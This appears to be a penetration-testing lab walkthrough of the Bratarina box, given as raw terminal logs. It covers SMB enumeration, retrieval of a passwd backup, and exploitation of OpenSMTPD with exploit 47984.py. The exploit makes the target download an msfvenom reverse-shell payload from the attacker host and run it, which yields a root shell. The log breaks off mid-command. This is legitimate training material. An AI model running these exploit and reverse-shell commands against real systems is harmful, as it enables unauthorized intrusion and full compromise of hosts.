```
@kali:~/offsec/bratarina$ nmap -sC -sV -oA simple 192.168.206.71
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-15 19:08 EDT
Nmap scan report for 192.168.206.71
Host is up (0.060s latency).
Not shown: 995 filtered ports
PORT    STATE  SERVICE     VERSION
22/tcp  open   ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:dd:2c:ea:2f:85:c5:89:bc:fc:e9:a3:38:f0:d7:50 (RSA)
|   256 e3:b7:65:c2:a7:8e:45:29:bb:62:ec:30:1a:eb:ed:6d (ECDSA)
|_  256 d5:5b:79:5b:ce:48:d8:57:46:db:59:4f:cd:45:5d:ef (ED25519)
25/tcp  open   smtp?
|_smtp-commands: Couldn't establish connection on port 25
53/tcp  closed domain
80/tcp  open   http        nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title:         Page not found - FlaskBB        
445/tcp open   netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
Service Info: Host: BRATARINA; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: -1s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: bratarina
|   NetBIOS computer name: BRATARINA\x00
|   Domain name: \x00
|   FQDN: bratarina
|_  System time: 2020-09-15T19:11:18-04:00
| smb-security-mode: 
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-09-15T23:11:19
|_  start_date: N/A

Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Sep 15 19:36:03 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.206.71
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
---------SNIP----------
 =========================================== 
|    Share Enumeration on 192.168.206.71    |
 =========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.

        Sharename       Type      Comment
        ---------       ----      -------
        backups         Disk      Share for backups
        IPC$            IPC       IPC Service (Samba 4.7.6-Ubuntu)
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 192.168.206.71
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//192.168.206.71/backups        Mapping: OK, Listing: OK
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//192.168.206.71/IPC$   [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
---------SNIP----------</pre></div>


kali@kali:~$ smbclient //MOUNT/backups -I 192.168.206.71 -N
Anonymous login successful
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Mon Jul  6 03:46:41 2020
  ..                                  D        0  Mon Jul  6 03:46:41 2020
  passwd.bak                          N     1747  Mon Jul  6 03:46:41 2020

                10253588 blocks of size 1024. 6363480 blocks available
smb: \&gt; cat passwd.bak
cat: command not found
smb: \&gt; get passwd.bak
getting file \passwd.bak of size 1747 as passwd.bak (6.8 KiloBytes/sec) (average 6.8 KiloBytes/sec)
smb: \&gt;</pre></div>



>kali@kali:~/offsec/bratarina$ cat passwd.bak
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
neil:x:1000:1000:neil,,,:/home/neil:/bin/bash
_smtpd:x:1001:1001:SMTP Daemon:/var/empty:/sbin/nologin
_smtpq:x:1002:1002:SMTPD Queue:/var/empty:/sbin/nologin
postgres:x:111:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash</pre></div>



kali@kali:~/offsec/bratarina$ rpcclient -U &quot;&quot; 192.168.91.71
Enter WORKGROUP\'s password: 
rpcclient $&gt; enumprivs
found 9 privileges

SeMachineAccountPrivilege               0:6 (0x0:0x6)
SeTakeOwnershipPrivilege                0:9 (0x0:0x9)
SeBackupPrivilege               0:17 (0x0:0x11)
SeRestorePrivilege              0:18 (0x0:0x12)
SeRemoteShutdownPrivilege               0:24 (0x0:0x18)
SePrintOperatorPrivilege                0:4097 (0x0:0x1001)
SeAddUsersPrivilege             0:4098 (0x0:0x1002)
SeDiskOperatorPrivilege                 0:4099 (0x0:0x1003)
SeSecurityPrivilege             0:8 (0x0:0x8)</pre></div>



rpcclient $&gt; lookupnames neil
neil S-1-22-1-1000 (User: 1)
rpcclient $&gt; lookupsids S-1-22-1-1000
S-1-22-1-1000 Unix User\neil (1)</pre></div>



kali@kali:~/offsec/bratarina$ nmap --script smtp-commands.nse -pT:25 192.168.206.71
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-21 21:06 EDT
Nmap scan report for 192.168.206.71
Host is up (0.069s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.49.206], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info 

Nmap done: 1 IP address (1 host up) scanned in 2.38 seconds</pre></div>



>kali@kali:~/offsec/bratarina$ searchsploit smtpd
------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------- ---------------------------------
Mercury/32 Mail SMTPD - AUTH CRAM-MD5 Buffer Overflow (Metasploit) | windows/remote/16821.rb
Mercury/32 Mail SMTPD - Remote Stack Overrun (PoC)                 | windows/dos/4294.pl
Mercury/32 Mail SMTPD 4.51 - SMTPD CRAM-MD5 Remote Overflow        | windows/remote/4301.cpp
OpenSMTPD - MAIL FROM Remote Code Execution (Metasploit)           | linux/remote/48038.rb
OpenSMTPD - OOB Read Local Privilege Escalation (Metasploit)       | linux/local/48185.rb
OpenSMTPD 6.4.0 &lt; 6.6.1 - Local Privilege Escalation + Remote Code | openbsd/remote/48051.pl
OpenSMTPD 6.6.2 - Remote Code Execution                            | linux/remote/47984.py
OpenSMTPD 6.6.3 - Arbitrary File Read                              | linux/remote/48139.c
OpenSMTPD &lt; 6.6.3p1 - Local Privilege Escalation + Remote Code Exe | openbsd/remote/48140.c
------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results</pre></div>



kali@kali:~/offsec/bratarina$ python3 47984.py 
Usage 47984.py &lt;target ip&gt; &lt;target port&gt; &lt;command&gt;
E.g. 47984.py 127.0.0.1 25 'touch /tmp/x'</pre></div>



kali@kali:~/offsec/bratarina$ python3 47984.py 192.168.206.71 25 'wget 192.168.49.206/trenches.txt'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done</pre></div>




kali@kali:~/offsec/bratarina$ sudo python3 -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.206.71 - - [21/Sep/2020 21:20:12] &quot;GET /trenches.txt HTTP/1.1&quot; 200 -</pre></div>



kali@kali:~/offsec/bratarina$ msfvenom -a x64 --platform Linux -p linux/x64/shell/reverse_tcp LHOST=192.168.49.206 LPORT=445 -f elf &gt; trenches
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes</pre></div>



kali@kali:~/offsec/bratarina$ python3 47984.py 192.168.206.71 25 'wget 192.168.49.206/trenches /tmp/trenches'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done</pre></div>

kali@kali:~/offsec/bratarina$ python3 47984.py 192.168.206.71 25 'chmod +x /tmp/trenches'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done</pre></div>



kali@kali:~/offsec/bratarina$ python3 47984.py 192.168.206.71 25 '/tmp/trenches'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done</pre></div>



kali@kali:~/offsec/bratarina$ sudo nc -lvnp 445
listening on [any] 445 ...
connect to [192.168.49.206] from (UNKNOWN) [192.168.206.71] 43144
ls
proof.txt
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
cat &quot;proof.txt
```